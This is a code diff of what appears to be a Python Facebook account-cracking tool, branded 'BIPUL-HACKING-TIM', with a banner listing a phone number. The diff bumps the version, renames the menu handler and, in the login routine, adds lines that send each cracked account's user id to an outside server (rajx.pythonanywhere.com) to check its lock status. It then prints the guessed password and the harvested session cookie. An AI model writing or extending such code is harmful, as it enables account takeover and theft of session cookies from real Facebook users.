@@ -147,13 +147,13 @@ logo = (f"""
 ╠══[Github                   • \33[1;38mBIPUL-HACKING-TIM ]  \33[1;34m   
 ╠══[Number                  • 01759689717 ]  \33[1;35m 
 ╠══[TOOLS                    • FREE ]          \33[1;32m   
-╠══[VERSION                  • 0.1 ]          \033[1;35m 
+╠══[VERSION                  • 0.2 ]          \033[1;35m 
 \033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
 try:
    print('\n\n\033[1;33mLOADING ASSET FILES ... \033[0;97m')
-   v = 5.2
-   update = ('5.2')
-   update = ('5.2')
+   v = 5.3
+   update = ('5.3')
+   update = ('5.3')
    if str(v) in update:
        os.system('clear')
    else:pass
@@ -179,11 +179,11 @@ def mumit_menu():
     print('\033[1;92m [0] EXIT TOOL')
     linex()
     mumit=input(' \033[1;32m[?] SELECT MENU: ')
-    if mumit in['1','01']:RAKIB()
+    if mumit in['1','01']:BIPUL()
     elif mumit in['0','00']:exit()
     else:exit()
     
-def RAKIB():
+def BIPUL():
     user=[]
     twf =[]
     os.getuid
@@ -265,6 +265,14 @@ def mumitx(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
+                cix = coki.split('c_user')[1]
+                cid = cix[0:15]
+                res = requests.get(f"https://rajx.pythonanywhere.com/live/uid={cid}").text
+                if 'LOCK' in res:
+                    return 'LOCK'
+                else:
+                    print(f'  \r\033[1;92m  [BIPUL-OK] '+uid+' • '+ps+'\33[0;92m')
+                    print(f'  \r\033[1;92m  [COOKIE] '+coki)
                 print('\r\r\033[1;32m[BIPUL-OK❤️] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                 print('\033[1;32m[COOKIE] = \033[1;37m'+coki+ '')
                 cek_apk(session,coki)
